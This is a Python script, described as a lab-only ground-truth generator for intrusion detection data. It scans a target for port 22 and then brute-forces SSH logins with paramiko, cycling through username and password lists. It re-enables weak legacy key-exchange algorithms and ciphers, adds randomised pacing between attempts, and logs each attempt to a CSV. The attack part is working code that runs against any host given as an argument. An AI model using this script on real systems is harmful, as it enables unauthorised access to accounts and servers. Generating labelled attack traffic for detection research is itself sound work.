"""
SSH brute-force GT generator (lab only)
Fixes: IncompatiblePeer / no acceptable host key
"""

import csv
import datetime
import logging
import random
import socket
import sys
import time
import warnings
from pathlib import Path
from typing import List

import paramiko

# Quiet noisy paramiko background thread tracebacks
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
warnings.filterwarnings("ignore")

# Lab: allow older host-key / kex algorithms (Metasploitable, old OpenSSH)
paramiko.Transport._preferred_keys = (
    "ssh-rsa",
    "ssh-dss",
    "ecdsa-sha2-nistp256",
    "ecdsa-sha2-nistp384",
    "ecdsa-sha2-nistp521",
    "rsa-sha2-512",
    "rsa-sha2-256",
)
paramiko.Transport._preferred_pubkeys = paramiko.Transport._preferred_keys
paramiko.Transport._preferred_kex = (
    "diffie-hellman-group14-sha256",
    "diffie-hellman-group14-sha1",
    "diffie-hellman-group-exchange-sha256",
    "diffie-hellman-group-exchange-sha1",
    "diffie-hellman-group1-sha1",
    "ecdh-sha2-nistp256",
    "ecdh-sha2-nistp384",
    "ecdh-sha2-nistp521",
)
paramiko.Transport._preferred_ciphers = (
    "aes128-ctr",
    "aes192-ctr",
    "aes256-ctr",
    "aes128-cbc",
    "aes256-cbc",
    "3des-cbc",
)


def get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def load_list(file_path: str) -> List[str]:
    path = Path(file_path)
    if not path.exists():
        print(f"[!] File not found: {file_path}")
        return []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [
            line.strip()
            for line in f
            if line.strip() and not line.startswith("#")
        ]


def scan_port_22(target: str) -> bool:
    print(f"[*] Scanning port 22 on {target}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    result = sock.connect_ex((target, 22))
    sock.close()
    if result == 0:
        print("[+] Port 22 is OPEN")
        return True
    print("[-] Port 22 is CLOSED or not reachable")
    return False


def log_ground_truth(csv_path: str, src_ip: str, dst_ip: str, label: str):
    path = Path(csv_path)
    path.parent.mkdir(parents=True, exist_ok=True)
    file_exists = path.exists()
    with open(path, mode="a", newline="", encoding="utf-8") as csvfile:
        writer = csv.writer(csvfile)
        if not file_exists:
            writer.writerow(["timestamp", "src_ip", "dst_ip", "label"])
        timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat()
        writer.writerow([timestamp, src_ip, dst_ip, label])


def make_ssh_client() -> paramiko.SSHClient:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return ssh


def ssh_brute_force(
    target: str,
    usernames: List[str],
    passwords: List[str],
    csv_output_path: str,
    delay: float = 1.0,
):
    src_ip = get_local_ip()
    print(f"\n[*] Starting SSH Brute-Force on {target}:22")
    print(f"[*] Logging ground truth to: {csv_output_path}\n")

    for username in usernames:
        for pwd in passwords:
            # Always log attempt for IDS GT (even if handshake fails)
            log_ground_truth(csv_output_path, src_ip, target, "ssh-brute")

            ssh = None
            try:
                ssh = make_ssh_client()
                ssh.connect(
                    hostname=target,
                    port=22,
                    username=username,
                    password=pwd,
                    timeout=20,
                    banner_timeout=40,
                    auth_timeout=25,
                    look_for_keys=False,
                    allow_agent=False,
                    # disabled algorithms allowed for lab targets
                )
                print(f"\n[!] SUCCESS → {username}:{pwd}")
                ssh.close()
                return True

            except paramiko.AuthenticationException:
                print(f"[-] Failed auth: {username}:{pwd}")

            except paramiko.ssh_exception.IncompatiblePeer as e:
                print(f"[!] Host-key/KEX incompatible: {e}")
                print("    (GT still logged. Check server sshd algorithms.)")
                time.sleep(1)

            except paramiko.SSHException as e:
                print(f"[!] SSH problem: {username}:{pwd} → {e}")
                time.sleep(2)

            except Exception as e:
                print(f"[!] Error: {username}:{pwd} → {type(e).__name__}: {e}")
                time.sleep(1)

            finally:
                if ssh:
                    try:
                        ssh.close()
                    except Exception:
                        pass

            time.sleep(delay + random.uniform(0.2, 0.8))

    print("[-] Brute force finished. No credentials found.")
    return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 gt-ssh.py <IP> [csv_output_path]")
        sys.exit(1)

    TARGET = sys.argv[1]
    CSV_PATH = sys.argv[2] if len(sys.argv) > 2 else "./ground/ssh.csv"
    USERS_FILE = "user.txt"
    PASSWORDS_FILE = "password.txt"

    usernames = load_list(USERS_FILE)
    passwords = load_list(PASSWORDS_FILE)

    if not usernames or not passwords:
        print("[!] Create user.txt and password.txt (one entry per line).")
        sys.exit(1)

    if scan_port_22(TARGET):
        ssh_brute_force(TARGET, usernames, passwords, CSV_PATH)
    else:
        print("[!] Port 22 not open.")
